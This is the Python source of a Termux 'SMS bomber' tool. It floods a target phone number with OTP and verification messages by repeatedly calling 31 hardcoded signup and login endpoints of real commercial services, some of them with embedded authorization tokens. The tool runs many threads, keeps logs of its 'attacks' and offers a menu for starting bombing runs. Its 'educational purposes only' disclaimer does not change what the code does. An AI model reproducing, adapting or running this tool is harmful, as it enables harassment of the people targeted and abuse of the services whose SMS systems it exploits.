#!/usr/bin/env python3
# ==============================================
# 🐉 THW - Ultimate SMS Bomber Suite
# Premium All-in-One Tool for Termux
# ==============================================
# Developer: THW🐉
# Version: 5.0 PRO MAX
# ==============================================

import asyncio
import base64
import json
import os
import sys
import random
import time
import threading
import subprocess
import signal
import platform
import socket
import datetime
import re
import hashlib
import urllib.request
import urllib.parse
import urllib.error
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
    import aiohttp
    import ssl
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    os.system("pip install requests aiohttp colorama")
    import requests
    import aiohttp
    import ssl
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==============================================
# 🎨 COLORS & STYLES
# ==============================================
C = {
    'R': Fore.RED,
    'G': Fore.GREEN,
    'Y': Fore.YELLOW,
    'B': Fore.BLUE,
    'M': Fore.MAGENTA,
    'C': Fore.CYAN,
    'W': Fore.WHITE,
    'BL': Fore.BLACK,
    'LR': Fore.LIGHTRED_EX,
    'LG': Fore.LIGHTGREEN_EX,
    'LY': Fore.LIGHTYELLOW_EX,
    'LB': Fore.LIGHTBLUE_EX,
    'LM': Fore.LIGHTMAGENTA_EX,
    'LC': Fore.LIGHTCYAN_EX,
    'LW': Fore.LIGHTWHITE_EX,
    'BR': Style.BRIGHT,
    'DM': Style.DIM,
    'RS': Style.RESET_ALL,
}

# ==============================================
# 🔒 PROTECTION SYSTEM
# ==============================================
PROTECTED_FILE = "THW_protected.json"
CONFIG_FILE = "THW_config.json"
ATTACK_LOG = "THW_attacks.log"

# Default Configuration
DEFAULT_CONFIG = {
    "country_code": "91",
    "delay": 0.3,
    "threads": 25,
    "max_requests": 500,
    "auto_mode": False,
    "theme": "dragon",
    "sound": True,
    "animation": True
}

# ==============================================
# 🎯 API COLLECTION - ALL 31+ WORKING APIS
# ==============================================
API_INDICES = list(range(31))

def get_api_function(phone, api_index, country_code):
    """Execute API attack with given index"""
    cc = str(country_code)
    pn = str(phone)
    session = requests.Session()
    
    try:
        # API 0: OYO Rooms
        if api_index == 0:
            url = f"https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B{cc}&nod=4&phone={pn}"
            response = session.get(url, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 1: Delhivery
        elif api_index == 1:
            url = f"https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={pn}"
            response = session.get(url, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 2: ConfirmTkt
        elif api_index == 2:
            url = f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={pn}"
            response = session.get(url, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 3: PharmEasy
        elif api_index == 3:
            headers = {
                'Host': 'pharmeasy.in',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
                'Accept': '*/*',
                'Content-Type': 'application/json',
            }
            data = {"contactNumber": pn}
            response = session.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 4: Hero MotoCorp
        elif api_index == 4:
            headers = {
                'Host': 'www.heromotocorp.com',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            }
            data = {'mobile_no': pn, 'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis='}
            response = session.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 5: IndiaLends
        elif api_index == 5:
            headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
            data = {'aeyder03teaeare': '1', 'ertysvfj74sje': cc, 'jfsdfu14hkgertd': pn, 'lj80gertdfg': '0'}
            response = session.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 6: Flipkart Signup
        elif api_index == 6:
            headers = {'Content-Type': 'application/json; charset=utf-8'}
            data = {"loginId": [f"+{cc}{pn}"], "supportAllStates": True}
            response = session.post('https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 7: Flipkart OTP
        elif api_index == 7:
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            data = {'loginId': f'+{cc}{pn}', 'state': 'VERIFIED', 'churnEmailRequest': 'false'}
            response = session.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 8: Lenskart
        elif api_index == 8:
            data = {'mobile': pn, 'submit': '1'}
            response = session.post('https://www.ref-r.com/clients/lenskart/smsApi', headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 9: Practo
        elif api_index == 9:
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            data = {'client_name': 'Practo Android App', 'mobile': f'+{cc}{pn}'}
            response = session.post("https://accounts.practo.com/send_otp", headers=headers, data=data, timeout=5)
            return "success" in response.text.lower()
        
        # API 10: PizzaHut
        elif api_index == 10:
            headers = {'Content-Type': 'application/json'}
            data = {"customer": {"MobileNo": pn, "UserName": pn, "merchantId": "98d18d82-ba59-4957-9c92-3f89207a34f6"}}
            response = session.post('https://m.pizzahut.co.in/api/cart/send-otp?langCode=en', headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 11: Goibibo
        elif api_index == 11:
            data = {'mbl': pn}
            response = session.post('https://www.goibibo.com/common/downloadsms/', data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 12: Apollo Pharmacy
        elif api_index == 12:
            data = {'mobile': pn}
            response = session.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', data=data, timeout=5)
            return "sent" in response.text.lower()
        
        # API 13: Ajio
        elif api_index == 13:
            headers = {'Content-Type': 'application/json'}
            data = {"firstName": "User", "login": "user@gmail.com", "password": "Pass@123", "mobileNumber": pn, "requestType": "SENDOTP"}
            response = session.post('https://www.ajio.com/api/auth/signupSendOTP', headers=headers, json=data, timeout=5)
            return '"statusCode":"1"' in response.text
        
        # API 14: AltBalaji
        elif api_index == 14:
            headers = {'Content-Type': 'application/json;charset=UTF-8'}
            data = {"country_code": cc, "phone_number": pn}
            response = session.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 15: Aala
        elif api_index == 15:
            data = {'email': f'{cc}{pn}', 'firstname': 'User', 'lastname': 'User'}
            response = session.post('https://www.aala.com/accustomer/ajax/getOTP', data=data, timeout=5)
            return 'code:' in response.text
        
        # API 16: Grab
        elif api_index == 16:
            data = {'method': 'SMS', 'countryCode': 'id', 'phoneNumber': f'{cc}{pn}', 'templateID': 'pax_android_production'}
            response = session.post('https://api.grab.com/grabid/v1/phone/otp', data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 17: Gokwik 1
        elif api_index == 17:
            headers = {
                "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo",
                "Content-Type": "application/json",
                "gk-merchant-id": "19g6im8srkz9y"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 18: Gokwik 2
        elif api_index == 18:
            headers = {
                "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzMzc1OCwiZXhwIjoxNzU3NDMzODE4fQ._L8MBwvDff7ijaweocA302oqIA8dGOsJisPydxytvf8",
                "Content-Type": "application/json",
                "gk-merchant-id": "19an4fq2kk5y"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 19: Breeze
        elif api_index == 19:
            headers = {"Content-Type": "application/json"}
            data = {"phoneNumber": pn, "authVerificationType": "otp", "countryCode": f"+{cc}"}
            response = session.post("https://api.breeze.in/session/start", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 20: Gokwik 3
        elif api_index == 20:
            headers = {
                "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzNTg0OCwiZXhwIjoxNzU3NDM1OTA4fQ._37TKeyXUxkMEEteU2IIVeSENo8TXaNv32x5rWaJbzA",
                "Content-Type": "application/json",
                "gk-merchant-id": "19g6ilhej3mfc"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 21: Kisan
        elif api_index == 21:
            headers = {"Content-Type": "application/json"}
            data = {"mobile_number": pn, "client_id": "kisan-app"}
            response = session.post("https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 22: PenPencil
        elif api_index == 22:
            headers = {"Content-Type": "application/json"}
            data = {"mobile": pn, "organizationId": "5eb393ee95fab7468a79d189"}
            response = session.post("https://api.penpencil.co/v1/users/resend-otp?smsType=2", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 23: Khatabook
        elif api_index == 23:
            headers = {"Content-Type": "application/json"}
            data = {"country_code": f"+{cc}", "phone": pn, "app_signature": "Jc/Zu7qNqQ2"}
            response = session.post("https://api.khatabook.com/v1/auth/request-otp", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 24: Jockey
        elif api_index == 24:
            url = f"https://www.jockey.in/apps/jotp/api/login/send-otp/+{cc}{pn}?whatsapp=true"
            response = session.get(url, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 25: Gokwik 4
        elif api_index == 25:
            headers = {
                "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA",
                "Content-Type": "application/json",
                "gk-merchant-id": "19kc37zcdyiu"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 26: Vidyakul
        elif api_index == 26:
            data = {'phone': pn, 'rcsconsent': 'true'}
            response = session.post('https://vidyakul.com/signup-otp/send', data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 27: Aditya Birla
        elif api_index == 27:
            headers = {"Content-Type": "application/json"}
            data = {'request': 'CepT08jilRIQiS1EpaNsQVXbRv3PS/eUQ1lAbKfLJuUNvkkemX01P9n5tJiwyfDP3eEXRcol6uGvIAmdehuWBw=='}
            response = session.post('https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp', headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 28: Pinknblu
        elif api_index == 28:
            data = {'_token': 'fbhGqnDcF41IumYCLIyASeXCntgFjC9luBVoSAcb', 'country_code': f'+{cc}', 'phone': pn}
            response = session.post('https://pinknblu.com/v1/auth/generate/otp', data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 29: Udaan
        elif api_index == 29:
            data = {'mobile': pn}
            response = session.post('https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true', data=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        # API 30: Nuvama
        elif api_index == 30:
            headers = {"Content-Type": "application/json"}
            data = {"contactInfo": pn, "mode": "SMS"}
            response = session.post('https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO', headers=headers, json=data, timeout=5)
            return response.status_code in [200, 201, 202]
        
        return False
    except:
        return False

# ==============================================
# 🐉 THW BANNER
# ==============================================
def get_banner():
    banner = f"""
{C['R']}{C['BR']}
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║     ████████╗██╗  ██╗██╗    ██╗                             ║
║     ╚══██╔══╝██║  ██║██║    ██║                             ║
║        ██║   ███████║██║ █╗ ██║                             ║
║        ██║   ██╔══██║██║███╗██║                             ║
║        ██║   ██║  ██║╚███╔███╔╝                             ║
║        ╚═╝   ╚═╝  ╚═╝ ╚══╝╚══╝                              ║
║                                                               ║
║              ██████████████████████████████████              ║
║              ██       THW TOOL v5.0       ██                 ║
║              ██████████████████████████████████              ║
║                                                               ║
║             🐉 PREMIUM ALL-IN-ONE SUITE 🐉                  ║
║                                                               ║
╠═══════════════════════════════════════════════════════════════╣
║  📱 Developer : THW                                          ║
║  ⚡ Version   : 5.0 PRO MAX                                  ║
║  🧪 Mode      : LOCAL TESTING                                ║
╚═══════════════════════════════════════════════════════════════╝
{C['R']}{C['BR']}
"""
    return banner

# ==============================================
# 💾 DATA MANAGEMENT
# ==============================================
def load_protected():
    if not os.path.exists(PROTECTED_FILE):
        return {}
    try:
        with open(PROTECTED_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_protected(data):
    with open(PROTECTED_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

def load_config():
    if not os.path.exists(CONFIG_FILE):
        save_config(DEFAULT_CONFIG)
        return DEFAULT_CONFIG
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return DEFAULT_CONFIG

def save_config(data):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

def log_attack(phone, requests_sent, success_count):
    with open(ATTACK_LOG, "a", encoding="utf-8") as f:
        f.write(f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {phone} | {requests_sent} | {success_count}\n")

def encrypt_number(phone):
    return base64.b64encode(phone.encode()).decode()

def is_protected(phone):
    data = load_protected()
    return phone in data

def protect_number(phone, name="Protected"):
    data = load_protected()
    data[phone] = {
        "phone": phone,
        "name": name,
        "encrypted": encrypt_number(phone),
        "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_protected(data)
    return True

def remove_protected(phone):
    data = load_protected()
    if phone in data:
        del data[phone]
        save_protected(data)
        return True
    return False

# ==============================================
# 💥 BOMBING ENGINE
# ==============================================
class BombingEngine:
    def __init__(self):
        self.active = {}
        self.counts = {}
        self.lock = threading.Lock()
        self.config = load_config()
        self.executor = ThreadPoolExecutor(max_workers=50)
        
    def start_attack(self, phone, max_requests=None, threads=None):
        if max_requests is None:
            max_requests = self.config.get("max_requests", 500)
        if threads is None:
            threads = self.config.get("threads", 25)
            
        # Validate phone
        phone = self.clean_phone(phone)
        if not phone or len(phone) != 10:
            return False, "Invalid phone number"
        
        # Check protection
        if is_protected(phone):
            return False, "Number is protected!"
        
        # Check if already running
        if phone in self.active and self.active[phone]:
            return False, "Attack already running!"
        
        self.active[phone] = True
        self.counts[phone] = 0
        self.config = load_config()
        
        # Start threads
        for i in range(threads):
            self.executor.submit(self._worker, phone, max_requests)
        
        return True, f"Attack started with {threads} threads!"
    
    def _worker(self, phone, max_requests):
        available_apis = API_INDICES.copy()
        cc = self.config.get("country_code", "91")
        delay = self.config.get("delay", 0.3)
        
        while self.active.get(phone, False) and self.counts.get(phone, 0) < max_requests:
            if not available_apis:
                break
            api_index = random.choice(available_apis)
            success = get_api_function(phone, api_index, cc)
            
            with self.lock:
                self.counts[phone] = self.counts.get(phone, 0) + 1
            
            if not success:
                if api_index in available_apis:
                    available_apis.remove(api_index)
            
            time.sleep(delay)
    
    def stop_attack(self, phone):
        if phone in self.active:
            self.active[phone] = False
            return True, "Attack stopped!"
        return False, "No active attack!"
    
    def get_status(self, phone):
        if phone in self.active:
            count = self.counts.get(phone, 0)
            max_req = self.config.get("max_requests", 500)
            progress = (count / max_req) * 100 if max_req > 0 else 0
            return {
                "active": self.active[phone],
                "count": count,
                "max": max_req,
                "progress": min(progress, 100)
            }
        return None
    
    def clean_phone(self, phone):
        phone = ''.join(filter(str.isdigit, phone))
        if phone.startswith('91') and len(phone) > 10:
            phone = phone[2:]
        if phone.startswith('0'):
            phone = phone[1:]
        return phone
    
    def get_stats(self):
        stats = {
            "total_attacks": 0,
            "total_requests": 0,
            "active_attacks": 0
        }
        for phone, active in self.active.items():
            if active:
                stats["active_attacks"] += 1
            stats["total_attacks"] += 1
            stats["total_requests"] += self.counts.get(phone, 0)
        return stats

# ==============================================
# 🎨 UI COMPONENTS
# ==============================================
def progress_bar(progress, width=30):
    filled = int(width * progress / 100)
    bar = '█' * filled + '░' * (width - filled)
    return bar

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_header():
    clear_screen()
    print(get_banner())

def print_menu():
    print(f"\n{C['C']}{'═'*55}{C['RS']}")
    print(f"{C['BR']}{C['Y']}  🎯 MAIN MENU{C['RS']}")
    print(f"{C['C']}{'═'*55}{C['RS']}")
    print(f"  {C['G']}[1]{C['RS']} 🔥 Start Bombing")
    print(f"  {C['G']}[2]{C['RS']} 🛑 Stop Bombing")
    print(f"  {C['G']}[3]{C['RS']} 📊 Attack Status")
    print(f"  {C['G']}[4]{C['RS']} 📘 Protected Numbers")
    print(f"  {C['G']}[5]{C['RS']} 🔒 Add Protection")
    print(f"  {C['G']}[6]{C['RS']} 🗑️ Remove Protection")
    print(f"  {C['G']}[7]{C['RS']} ⚙️ Settings")
    print(f"  {C['G']}[8]{C['RS']} 📋 Attack Logs")
    print(f"  {C['G']}[9]{C['RS']} 🐉 About")
    print(f"  {C['G']}[0]{C['RS']} 🚪 Exit")
    print(f"{C['C']}{'═'*55}{C['RS']}")

# ==============================================
# 🎮 MAIN APPLICATION
# ==============================================
class THWBomber:
    def __init__(self):
        self.engine = BombingEngine()
        self.config = load_config()
        self.running = True
        
    def run(self):
        while self.running:
            try:
                print_header()
                print_menu()
                
                choice = input(f"\n{C['BR']}{C['G']}👉 Select option [0-9]: {C['RS']}").strip()
                
                if choice == "1":
                    self.start_bombing_menu()
                elif choice == "2":
                    self.stop_bombing_menu()
                elif choice == "3":
                    self.status_menu()
                elif choice == "4":
                    self.show_protected_menu()
                elif choice == "5":
                    self.add_protection_menu()
                elif choice == "6":
                    self.remove_protection_menu()
                elif choice == "7":
                    self.settings_menu()
                elif choice == "8":
                    self.logs_menu()
                elif choice == "9":
                    self.about_menu()
                elif choice == "0":
                    self.running = False
                    print(f"\n{C['G']}👋 Thank you for using THW TEM!{C['RS']}\n")
                else:
                    print(f"\n{C['R']}❌ Invalid option!{C['RS']}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                self.running = False
                print(f"\n\n{C['Y']}⚠️ Exiting...{C['RS']}\n")
                break
            except Exception as e:
                print(f"\n{C['R']}❌ Error: {e}{C['RS']}")
                time.sleep(2)
    
    def start_bombing_menu(self):
        print_header()
        print(f"\n{C['C']}{'═'*55}{C['RS']}")
        print(f"{C['BR']}{C['Y']}  🔥 START BOMBING{C['RS']}")
        print(f"{C['C']}{'═'*55}{C['RS']}")
        
        phone = input(f"\n{C['BR']}{C['G']}📱 Enter target number (10 digits): {C['RS']}").strip()
        
        if not phone or len(phone) != 10 or not phone.isdigit():
            print(f"\n{C['R']}❌ Invalid number!{C['RS']}")
            time.sleep(1.5)
            return
        
        # Check if number is protected
        if is_protected(phone):
            print(f"\n{C['R']}❌ This number is protected!{C['RS']}")
            time.sleep(1.5)
            return
        
        print(f"\n{C['Y']}⚙️ Configuration:{C['RS']}")
        print(f"  {C['C']}[1]{C['RS']} Default ({self.config.get('max_requests', 500)} requests, {self.config.get('threads', 25)} threads)")
        print(f"  {C['C']}[2]{C['RS']} Custom")
        print(f"  {C['C']}[3]{C['RS']} Cancel")
        
        config_choice = input(f"\n{C['BR']}{C['G']}👉 Choose [1/2/3]: {C['RS']}").strip()
        
        if config_choice == "3":
            return
        
        max_requests = self.config.get("max_requests", 500)
        threads = self.config.get("threads", 25)
        
        if config_choice == "2":
            try:
                max_requests = int(input(f"  {C['BR']}Max requests (default {max_requests}): {C['RS']}").strip() or max_requests)
                threads = int(input(f"  {C['BR']}Threads (default {threads}): {C['RS']}").strip() or threads)
            except:
                pass
        
        success, message = self.engine.start_attack(phone, max_requests, threads)
        
        if success:
            print(f"\n{C['G']}✅ {message}{C['RS']}")
            print(f"\n{C['Y']}📊 Target: +{self.config.get('country_code', '91')}{phone}{C['RS']}")
            print(f"{C['Y']}📊 Max Requests: {max_requests}{C['RS']}")
            print(f"{C['Y']}🧵 Threads: {threads}{C['RS']}")
            log_attack(phone, 0, 0)
        else:
            print(f"\n{C['R']}❌ {message}{C['RS']}")
        
        time.sleep(2)
    
    def stop_bombing_menu(self):
        print_header()
        print(f"\n{C['C']}{'═'*55}{C['RS']}")
        print(f"{C['BR']}{C['Y']}  🛑 STOP BOMBING{C['RS']}")
        print(f"{C['C']}{'═'*55}{C['RS']}")
        
        phone = input(f"\n{C['BR']}{C['G']}📱 Enter target number: {C['RS']}").strip()
        
        success, message = self.engine.stop_attack(phone)
        print(f"\n{C['G'] if success else 'R'}📊 {message}{C['RS']}")
        time.sleep(1.5)
    
    def status_menu(self):
        print_header()
        print(f"\n{C['C']}{'═'*55}{C['RS']}")
        print(f"{C['BR']}{C['Y']}  📊 ATTACK STATUS{C['RS']}")
        print(f"{C['C']}{'═'*55}{C['RS']}")
        
        stats = self.engine.get_stats()
        print(f"\n{C['G']}📊 Total Attacks: {stats['total_attacks']}{C['RS']}")
        print(f"{C['G']}📊 Total Requests: {stats['total_requests']}{C['RS']}")
        print(f"{C['G']}⚡ Active Attacks: {stats['active_attacks']}{C['RS']}")
        
        # Show active attacks
        active_found = False
        for phone, active in self.engine.active.items():
            if active:
                active_found = True
                status = self.engine.get_status(phone)
                if status:
                    bar = progress_bar(status['progress'])
                    print(f"\n{C['C']}📱 Target: +{self.config.get('country_code', '91')}{phone}{C['RS']}")
                    print(f"  {C['G']}Requests: {status['count']}/{status['max']}{C['RS']}")
                    print(f"  {C['Y']}Progress: [{bar}] {status['progress']:.1f}%{C['RS']}")
        
        if not active_found:
            print(f"\n{C['Y']}ℹ️ No active attacks running.{C['RS']}")
        
        print(f"\n{C['Y']}Press Enter to continue...{C['RS']}")
        input()
    
    def show_protected_menu(self):
        print_header()
        print(f"\n{C['C']}{'═'*55}{C['RS']}")
        print(f"{C['BR']}{C['Y']}  📘 PROTECTED NUMBERS{C['RS']}")
        print(f"{C['C']}{'═'*55}{C['RS']}")
        
        data = load_protected()
        if not data:
            print(f"\n{C['Y']}ℹ️ No protected numbers found.{C['RS']}")
        else:
            print(f"\n{C['G']}Total Protected: {len(data)}{C['RS']}")
            print(f"{C['C']}{'─'*55}{C['RS']}")
            for phone, info in data.items():
                print(f"  {C['C']}📱 {phone}{C['RS']}")
                print(f"     {C['Y']}Name: {info.get('name', 'Unknown')}{C['RS']}")
                print(f"     {C['Y']}Date: {info.get('date', 'Unknown')}{C['RS']}")
                print(f"{C['C']}{'─'*55}{C['RS']}")
        
        print(f"\n{C['Y']}Press Enter to continue...{C['RS']}")
        input()
    
    def add_protection_menu(self):
        print_header()
        print(f"\n{C['C']}{'═'*55}{C['RS']}")
        print(f"{C['BR']}{C['Y']}  🔒 ADD PROTECTION{C['RS']}")
        print(f"{C['C']}{'═'*55}{C['RS']}")
        
        phone = input(f"\n{C['BR']}{C['G']}📱 Enter number to protect: {C['RS']}").strip()
        phone = self.engine.clean_phone(phone)
        
        if not phone or len(phone) != 10:
            print(f"\n{C['R']}❌ Invalid number!{C['RS']}")
            time.sleep(1.5)
            return
        
        if is_protected(phone):
            print(f"\n{C['Y']}⚠️ Number already protected!{C['RS']}")
            time.sleep(1.5)
            return
        
        name = input(f"{C['BR']}{C['G']}👤 Enter name (optional): {C['RS']}").strip() or "Protected"
        
        protect_number(phone, name)
        print(f"\n{C['G']}✅ Number protected successfully!{C['RS']}")
        time.sleep(1.5)
    
    def remove_protection_menu(self):
        print_header()
        print(f"\n{C['C']}{'═'*55}{C['RS']}")
        print(f"{C['BR']}{C['Y']}  🗑️ REMOVE PROTECTION{C['RS']}")
        print(f"{C['C']}{'═'*55}{C['RS']}")
        
        phone = input(f"\n{C['BR']}{C['G']}📱 Enter number to remove: {C['RS']}").strip()
        
        if remove_protected(phone):
            print(f"\n{C['G']}✅ Protection removed!{C['RS']}")
        else:
            print(f"\n{C['R']}❌ Number not found in protection list!{C['RS']}")
        
        time.sleep(1.5)
    
    def settings_menu(self):
        print_header()
        print(f"\n{C['C']}{'═'*55}{C['RS']}")
        print(f"{C['BR']}{C['Y']}  ⚙️ SETTINGS{C['RS']}")
        print(f"{C['C']}{'═'*55}{C['RS']}")
        
        config = load_config()
        
        print(f"\n{C['G']}📋 Current Settings:{C['RS']}")
        print(f"  {C['C']}Country Code: {C['W']}{config.get('country_code', '91')}{C['RS']}")
        print(f"  {C['C']}Delay: {C['W']}{config.get('delay', 0.3)}s{C['RS']}")
        print(f"  {C['C']}Threads: {C['W']}{config.get('threads', 25)}{C['RS']}")
        print(f"  {C['C']}Max Requests: {C['W']}{config.get('max_requests', 500)}{C['RS']}")
        print(f"  {C['C']}Theme: {C['W']}{config.get('theme', 'dragon')}{C['RS']}")
        
        print(f"\n{C['Y']}[1] Change Country Code")
        print(f"{C['Y']}[2] Change Delay")
        print(f"{C['Y']}[3] Change Threads")
        print(f"{C['Y']}[4] Change Max Requests")
        print(f"{C['Y']}[5] Reset to Defaults")
        print(f"{C['Y']}[0] Back")
        
        choice = input(f"\n{C['BR']}{C['G']}👉 Choose: {C['RS']}").strip()
        
        if choice == "1":
            cc = input(f"  {C['BR']}Country Code (current: {config.get('country_code', '91')}): {C['RS']}").strip()
            if cc.isdigit():
                config['country_code'] = cc
                save_config(config)
                print(f"\n{C['G']}✅ Updated!{C['RS']}")
        elif choice == "2":
            try:
                delay = float(input(f"  {C['BR']}Delay in seconds (current: {config.get('delay', 0.3)}): {C['RS']}").strip())
                config['delay'] = delay
                save_config(config)
                print(f"\n{C['G']}✅ Updated!{C['RS']}")
            except:
                print(f"\n{C['R']}❌ Invalid value!{C['RS']}")
        elif choice == "3":
            try:
                threads = int(input(f"  {C['BR']}Threads (current: {config.get('threads', 25)}): {C['RS']}").strip())
                config['threads'] = threads
                save_config(config)
                print(f"\n{C['G']}✅ Updated!{C['RS']}")
            except:
                print(f"\n{C['R']}❌ Invalid value!{C['RS']}")
        elif choice == "4":
            try:
                max_req = int(input(f"  {C['BR']}Max Requests (current: {config.get('max_requests', 500)}): {C['RS']}").strip())
                config['max_requests'] = max_req
                save_config(config)
                print(f"\n{C['G']}✅ Updated!{C['RS']}")
            except:
                print(f"\n{C['R']}❌ Invalid value!{C['RS']}")
        elif choice == "5":
            save_config(DEFAULT_CONFIG.copy())
            print(f"\n{C['G']}✅ Reset to defaults!{C['RS']}")
        
        time.sleep(1.5)
    
    def logs_menu(self):
        print_header()
        print(f"\n{C['C']}{'═'*55}{C['RS']}")
        print(f"{C['BR']}{C['Y']}  📋 ATTACK LOGS{C['RS']}")
        print(f"{C['C']}{'═'*55}{C['RS']}")
        
        if not os.path.exists(ATTACK_LOG):
            print(f"\n{C['Y']}ℹ️ No logs found.{C['RS']}")
        else:
            try:
                with open(ATTACK_LOG, "r", encoding="utf-8") as f:
                    lines = f.readlines()
                    if not lines:
                        print(f"\n{C['Y']}ℹ️ No logs found.{C['RS']}")
                    else:
                        print(f"\n{C['G']}📊 Last 20 entries:{C['RS']}")
                        print(f"{C['C']}{'─'*55}{C['RS']}")
                        for line in lines[-20:]:
                            print(f"  {C['W']}{line.strip()}{C['RS']}")
                        print(f"{C['C']}{'─'*55}{C['RS']}")
                        print(f"{C['Y']}Total entries: {len(lines)}{C['RS']}")
            except:
                print(f"\n{C['R']}❌ Error reading logs!{C['RS']}")
        
        print(f"\n{C['Y']}Press Enter to continue...{C['RS']}")
        input()
    
    def about_menu(self):
        print_header()
        print(f"\n{C['C']}{'═'*55}{C['RS']}")
        print(f"{C['BR']}{C['Y']}  🐉 ABOUT THW TEM{C['RS']}")
        print(f"{C['C']}{'═'*55}{C['RS']}")
        
        about_text = f"""
{C['G']}🐉 THW TEM v5.0{C['RS']}
{C['C']}Ultimate SMS Bomber Suite{C['RS']}

{C['Y']}📱 Developer:{C['RS']}THW
{C['Y']}⚡ APIs:{C['RS']} 31+ Working APIs
{C['Y']}💻 Platform:{C['RS']} Termux / Linux / Python3

{C['G']}🔧 Features:{C['RS']}
  • 31+ Working APIs
  • Multi-threading
  • Protection System
  • Real-time Status
  • Attack Logs
  • Custom Settings
  • Premium Design

{C['Y']}⚠️ Disclaimer:{C['RS']}
This tool is for educational purposes only.
Use responsibly and at your own risk.

{C['G']}⭐ Star this repo if you like it!{C['RS']}
"""
        print(about_text)
        print(f"\n{C['Y']}Press Enter to continue...{C['RS']}")
        input()

# ==============================================
